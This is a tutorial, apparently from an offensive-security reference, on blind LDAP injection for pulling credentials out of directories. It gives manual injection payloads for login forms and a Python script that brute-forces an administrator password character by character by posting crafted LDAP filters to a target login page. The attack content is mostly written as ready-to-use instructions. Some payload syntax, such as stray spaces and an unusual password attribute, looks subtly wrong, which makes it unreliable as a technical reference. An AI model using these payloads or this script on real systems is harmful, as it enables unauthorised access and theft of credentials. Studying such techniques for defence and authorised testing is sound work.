---
title: 'Blind Exploitation: LDAP and Credential Extraction'
description: Learn to perform blind LDAP injection for extracting sensitive data using
  manual and automated methods.
keywords:
- Blind LDAP Injection
- Credential Extraction
- Boolean Response
- Character-by-Character Data Extraction
- LDAP Filter
- Injection Automation
- Sensitive Data Extraction
- Application Behavior Analysis
---

# Blind Exploitation

## Context

Blind exploitation in LDAP injection involves extracting sensitive data from an LDAP directory without receiving direct error messages or visible content feedback. This technique requires an understanding of LDAP query structures, Boolean logic, and character encoding. Attackers leverage these skills to manipulate LDAP queries and infer data based on subtle behavioral changes in a target application. Prior knowledge of fundamental LDAP injection principles will be beneficial for effectively executing blind exploitation.

## Theory

### Blind LDAP Injection Fundamentals

Blind LDAP injection exploits input fields to infer data through LDAP responses without explicit error or content leakage. The core principle involves deducing the correctness of a query by observing subtle changes in application behavior. Applications that return only success or failure messages without detailed error feedback are vulnerable to this type of attack.

### Boolean Response Analysis in LDAP

Attackers use Boolean logic to craft LDAP filters that produce true or false conditions. This is achieved by observing application responses, such as success or failure messages, to specific payloads. In this process, attackers send specially crafted inputs that the LDAP server evaluates, leading to application behavior that indicates a true or false condition.

### Character-by-Character Data Extraction

This technique involves iteratively brute-forcing each character of a target value, such as a password, by employing substring or wildcard filters. This approach exploits implementation flaws like the lack of input sanitization, allowing for the injection of arbitrary LDAP filter logic. The attacker's goal is to reconstruct sensitive values by adjusting their payloads based on observed behavioral feedback from the application.

## Practice

### Manual Blind LDAP Injection for Credential Extraction

- **Identify a Vulnerable Input Field**: Begin by searching for input fields that interact with LDAP, like a login form.
- **Initial Payload Injection**:
  ```plaintext
  *) (|(sn=admin*))
  ```
  This payload attempts to test if any user with a surname (sn) starting with 'admin' exists.
- **Observe Application Responses**: Check for any changes in the application's behavior, such as successful login or different error messages, indicating a true match.
- **Refine the Injection Payload**:
  ```plaintext
  *) (|(sn=administrator)(sn=admina*))
  ```
  This payload refines the query to brute-force the next character.
- **Iterate Through Characters**: Continue adjusting the payload character-by-character until you reconstruct the full sensitive value, such as an admin password.

### Automated Blind LDAP Injection Using Custom Scripts

Execute the following Python script to automate blind LDAP injection:

```python
#!/usr/bin/env python3
import requests
import string

url = 'http://target-app/login'
charset = string.ascii_letters + string.digits
extracted = ''

for i in range(1, 21):  # Modify range according to expected password length
    for c in charset:
        payload = f"*) (|(sn=administrator)(password={extracted + c}*))"
        data = {'username': payload, 'password': 'irrelevant'}
        r = requests.post(url, data=data)
        if 'Welcome' in r.text:
            extracted += c
            print(f"[+] Found character: {c}")
            break

print(f"Extracted password: {extracted}")
```

This script iteratively sends crafted LDAP filter logic to brute-force sensitive data like the administrator password by interpreting application responses.

## Tools

- **Burp Suite**
- **Custom Python Scripts**